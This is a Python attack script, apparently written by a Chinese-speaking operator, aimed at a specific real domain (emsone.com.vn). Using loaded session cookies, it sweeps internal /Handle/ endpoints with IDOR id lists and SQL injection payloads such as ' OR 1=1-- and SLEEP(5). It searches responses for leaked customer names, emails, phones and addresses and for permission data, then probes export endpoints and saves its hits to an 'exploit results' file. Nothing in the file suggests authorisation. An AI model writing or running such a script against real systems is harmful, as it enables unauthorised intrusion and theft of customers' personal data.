#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import json
from urllib.parse import urljoin, quote
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

class APIExploiter:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.vulnerabilities = []
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_handle_endpoints(self):
        """测试Handle端点"""
        print("[*] 测试Handle端点...")
        
        endpoints = [
            "/Handle/SearchListProductVariantByWareHouseID?WareHouseID=",
            "/Handle/SearchPWDByVMapCode",
            "/Handle/SearchPWDByVNPMapsAutocomplete",
            "/Handle/SearchPWDByVNPMapsSearch",
            "/Handle/VNPMapsAutocomplete",
            "/Handle/SearchPWDByEMSVMapsSearch",
            "/Handle/SearchListWardByDistrictID?DistrictID=",
            "/Handle/SearchListCustomer",
            "/Handle/TransportPostageCharged",
            "/Handle/SearchPWDByEMSMapsSearch",
            "/Handle/SearchListProvince?Type=",
            "/Handle/SearchListFunctionalByGroupPermissionID?GroupPermissionID=",
            "/Handle/SearchListDistrictByProvinceID?ProvinceID=",
            "/Handle/SearchListWareHouse",
        ]
        
        # IDOR测试
        idor_test_ids = [0, 1, 2, -1, 999999, 9999999, "1'", "1\"", "1 OR 1=1"]
        
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            
            # 测试空参数
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"[+] {endpoint} [200] Length: {len(r.content)}")
                    if len(r.content) > 100:
                        print(f"    Response: {r.text[:200]}")
            except:
                pass
            
            # IDOR测试
            if '?' in endpoint:
                base_url_part = endpoint.split('?')[0]
                param_name = endpoint.split('?')[1].split('=')[0]
                
                for test_id in idor_test_ids:
                    test_url = f"{base_url_part}?{param_name}={test_id}"
                    full_url = urljoin(self.base_url, test_url)
                    try:
                        r = self.session.get(full_url, timeout=5)
                        if r.status_code == 200 and len(r.content) > 50:
                            print(f"[!] IDOR可能: {test_url}")
                            self.vulnerabilities.append({
                                'type': 'IDOR',
                                'url': full_url,
                                'test_value': test_id
                            })
                    except:
                        pass
    
    def test_search_endpoints(self):
        """测试搜索端点（SQL注入）"""
        print("[*] 测试搜索端点SQL注入...")
        
        search_endpoints = [
            "/Handle/SearchListCustomer",
            "/Handle/SearchPWDByVNPMapsSearch",
            "/Handle/SearchPWDByEMSMapsSearch",
            "/Handle/SearchListWareHouse",
        ]
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "1' UNION SELECT NULL--",
            "admin'--",
            "1' AND SLEEP(5)--",
            "' OR 'x'='x",
            "') OR ('x'='x",
        ]
        
        for endpoint in search_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            # GET测试
            for payload in sqli_payloads:
                try:
                    test_url = f"{url}?q={quote(payload)}"
                    r = self.session.get(test_url, timeout=10)
                    content_lower = r.text.lower()
                    
                    if any(err in content_lower for err in ['sql', 'mysql', 'error', 'syntax']):
                        print(f"[!] SQLi可能: {test_url}")
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': test_url,
                            'payload': payload
                        })
                except:
                    pass
            
            # POST测试
            for payload in sqli_payloads[:3]:  # 只测试前3个
                try:
                    data = {"q": payload, "search": payload, "keyword": payload}
                    r = self.session.post(url, json=data, timeout=10)
                    content_lower = r.text.lower()
                    
                    if any(err in content_lower for err in ['sql', 'mysql', 'error']):
                        print(f"[!] SQLi可能 (POST): {url}")
                        self.vulnerabilities.append({
                            'type': 'SQL Injection (POST)',
                            'url': url,
                            'payload': payload
                        })
                except:
                    pass
    
    def test_customer_endpoint(self):
        """深度测试客户端点"""
        print("[*] 深度测试客户端点...")
        
        # 测试IDOR
        customer_ids = [0, 1, 2, 4125, 4124, 4126, 999999]
        
        for cid in customer_ids:
            test_urls = [
                f"/Handle/SearchListCustomer?CustomerID={cid}",
                f"/Handle/SearchListCustomer?id={cid}",
                f"/Handle/SearchListCustomer?user_id={cid}",
                f"/Handle/SearchListCustomer?ID={cid}",
            ]
            
            for url in test_urls:
                full_url = urljoin(self.base_url, url)
                try:
                    r = self.session.get(full_url, timeout=5)
                    if r.status_code == 200 and len(r.content) > 100:
                        content = r.text.lower()
                        if any(keyword in content for keyword in ['name', 'email', 'phone', 'mobile', 'address']):
                            print(f"[!] 客户数据泄露: {url}")
                            print(f"    Response: {r.text[:300]}")
                            self.vulnerabilities.append({
                                'type': 'Customer Data Leak',
                                'url': full_url,
                                'customer_id': cid
                            })
                except:
                    pass
    
    def test_warehouse_endpoint(self):
        """测试仓库端点"""
        print("[*] 测试仓库端点...")
        
        warehouse_ids = [0, 1, 2, -1, 999999, "1'", "1 OR 1=1"]
        
        endpoint = "/Handle/SearchListProductVariantByWareHouseID"
        for wid in warehouse_ids:
            url = urljoin(self.base_url, f"{endpoint}?WareHouseID={wid}")
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"[+] WarehouseID={wid}: {len(r.content)} bytes")
                    if len(r.content) > 100:
                        print(f"    Data: {r.text[:200]}")
            except:
                pass
    
    def test_permission_endpoint(self):
        """测试权限端点（高风险）"""
        print("[*] 测试权限端点...")
        
        permission_ids = [0, 1, 2, -1, 999999]
        
        endpoint = "/Handle/SearchListFunctionalByGroupPermissionID"
        for pid in permission_ids:
            url = urljoin(self.base_url, f"{endpoint}?GroupPermissionID={pid}")
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"[+] PermissionID={pid}: {len(r.content)} bytes")
                    if len(r.content) > 50:
                        print(f"[!] 权限数据: {r.text[:300]}")
                        self.vulnerabilities.append({
                            'type': 'Permission Data Access',
                            'url': url,
                            'permission_id': pid
                        })
            except:
                pass
    
    def export_all_data(self):
        """尝试导出所有数据"""
        print("[*] 尝试导出数据...")
        
        export_endpoints = [
            "/Account/Export",
            "/Admin/Export",
            "/api/export",
            "/Report/Export",
            "/Data/Export",
        ]
        
        for endpoint in export_endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                # GET测试
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"[!] 导出端点: {url}")
                
                # POST测试
                r = self.session.post(url, json={}, timeout=5)
                if r.status_code == 200:
                    print(f"[!] 导出端点 (POST): {url}")
            except:
                pass
    
    def run_all(self):
        """执行所有利用"""
        print("[*] 开始API利用测试...\n")
        
        self.test_handle_endpoints()
        self.test_search_endpoints()
        self.test_customer_endpoint()
        self.test_warehouse_endpoint()
        self.test_permission_endpoint()
        self.export_all_data()
        
        # 保存结果
        with open('api_exploit_results.json', 'w', encoding='utf-8') as f:
            json.dump(self.vulnerabilities, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 发现 {len(self.vulnerabilities)} 个潜在漏洞")

if __name__ == "__main__":
    exploiter = APIExploiter()
    exploiter.run_all()